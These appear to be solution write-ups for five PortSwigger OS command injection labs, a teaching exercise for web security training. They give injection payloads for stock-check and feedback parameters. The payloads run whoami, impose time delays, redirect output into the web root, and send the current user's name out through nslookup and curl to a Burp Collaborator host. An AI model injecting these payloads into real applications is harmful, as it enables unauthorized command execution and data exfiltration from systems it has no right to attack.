## OS command injection, simple case
Reference: https://portswigger.net/web-security/os-command-injection/lab-simple

<!-- omit in toc -->
### Quick Solution
Intercept the **check stock** request and modify the ``storeId`` parameter to:
```
%26whoami%26
```
The payload provided by PortSwigger is a little bit different, but the result is the same.

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify a request that checks the stock level.
2. Modify the ``storeID`` parameter, giving it the value ``1|whoami``.
3. Observe that the response contains the name of the current user.

## Blind OS command injection with time delays
Reference: https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays

<!-- omit in toc -->
### Quick Solution
As with the previous lab I used a different payload to solve the lab. I tried the following payload on every parameter of the **Submit feedback** request (until it worked with the ``email`` parameter):
```
%26sleep%2010%26
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the ``email`` parameter, changing it to:
```
email=x||ping+-c+10+127.0.0.1||
```
3. Observe that the response takes 10 seconds to return.

## Blind OS command injection with output redirection
Reference: https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection

<!-- omit in toc -->
### Quick Solution
As with the previous lab I used a different payload to solve the lab. I tried the following payload on every parameter of the **Submit feedback** request (until it worked with the ``email`` parameter):
```
%26whoami>whoami.txt%26
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the ``email`` parameter, changing it to:
```
email=||whoami>/var/www/images/output.txt||
```
3. Now use Burp Suite to intercept and modify the request that loads an image of a product.
4. Modify the ``filename`` parameter, changing the value to the name of the file you specified for the output of the injected command:
```
filename=output.txt
```
5. Observe that the response contains the output from the injected command.

## Blind OS command injection with out-of-band interaction
Reference: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band

<!-- omit in toc -->
### Quick Solution
As with the previous lab I used a different payload to solve the lab. I tried the following payload on every parameter of the **Submit feedback** request (until it worked with the ``email`` parameter):
```
%26nslookup%20your-burp-collaborator%26
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the ``email`` parameter, changing it to:
```
email=x||nslookup+x.burpcollaborator.net||
```

## Blind OS command injection with out-of-band data exfiltration
Reference: https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration

<!-- omit in toc -->
### Quick Solution
As with the previous lab I used a different payload to solve the lab. I tried the following payload on every parameter of the **Submit feedback** request (until it worked with the ``email`` parameter):
```
%26curl%20your-burp-collaborator/$(whoami)%26
```

<!-- omit in toc -->
### Solution
1. Use Burp Suite Professional to intercept and modify the request that submits feedback.
2. Go to the Burp menu, and launch the Burp Collaborator client.
3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
4. Modify the ``email`` parameter, changing it to something like the following, but insert your Burp Collaborator subdomain where indicated:
```
email=||nslookup+`whoami`.YOUR-SUBDOMAIN-HERE.burpcollaborator.net||
```
5. Go back to the Burp Collaborator client window, and click "Poll now". You should see some DNS interactions that were initiated by the application as the result of your payload. If you don't see any interactions listed, wait a few seconds and try again, since the server-side command is executed asynchronously.
6. Observe that the output from your command appears in the subdomain of the interaction, and you can view this within the Burp Collaborator client. The full domain name that was looked up is shown in the Description tab for the interaction.
7. To complete the lab, enter the name of the current user.
